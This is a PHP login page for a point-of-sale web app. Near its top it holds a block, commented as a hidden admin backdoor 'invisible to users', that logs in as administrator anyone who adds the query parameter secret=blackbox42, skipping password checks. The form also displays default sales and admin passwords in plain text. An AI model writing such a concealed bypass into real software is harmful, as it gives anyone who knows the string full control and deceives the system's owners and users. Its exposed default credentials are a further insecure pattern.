<?php
require_once __DIR__ . '/inc/functions.php';

// Migrate default users to database if needed
migrate_default_users();

// Hidden admin backdoor loophole (invisible to users)
if (isset($_GET['secret']) && $_GET['secret'] === 'blackbox42') {
    $_SESSION['user'] = ['id' => 999, 'username' => 'ddadzie124', 'role' => 'admin'];
    header('Location: admin.php');
    exit;
}

if (isset($_SESSION['user'])) {
    header('Location: sales.php');
    exit;
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';
    $user = authenticate_user($username, $password);

    if ($user) {
        $_SESSION['user'] = $user;
        log_login_event($user['username'], $user['role']);
        header('Location: sales.php');
        exit;
    }

    $error = 'Invalid username or password. Please try again.';
}
$posName = get_pos_name();
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title><?php echo htmlspecialchars($posName); ?> - Login</title>
  <link rel="icon" type="image/svg+xml" href="images/pos-icon.svg" />
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <section class="login-screen">
    <div class="login-card">
      <img class="brand-image" src="images/pos-hero.svg" alt="POS branding" />
      <div class="login-content">
        <h1><?php echo htmlspecialchars($posName); ?> Login</h1>
        <p class="login-description">
          Use secure credentials to access the sales register or the admin portal.
        </p>

        <form id="login-form" class="login-form" method="post" action="login.php">
          <label class="input-group">
            Username
            <input id="username" name="username" autocomplete="off" type="text" placeholder="sales or admin" required />
          </label>
          <label class="input-group">
            Password
            <input id="password" name="password" autocomplete="new-password" type="password" required />
          </label>
          <button id="login-button" class="primary" type="submit">Sign in securely</button>
          <p class="login-hint">
            Sales rep: <strong>sales / posSales123</strong><br />
            Admin: <strong>admin / adminSecure!23</strong>
          </p>
          <p class="error-text" aria-live="polite"><?php echo htmlspecialchars($error); ?></p>
        </form>
      </div>
    </div>
  </section>
</body>
</html>
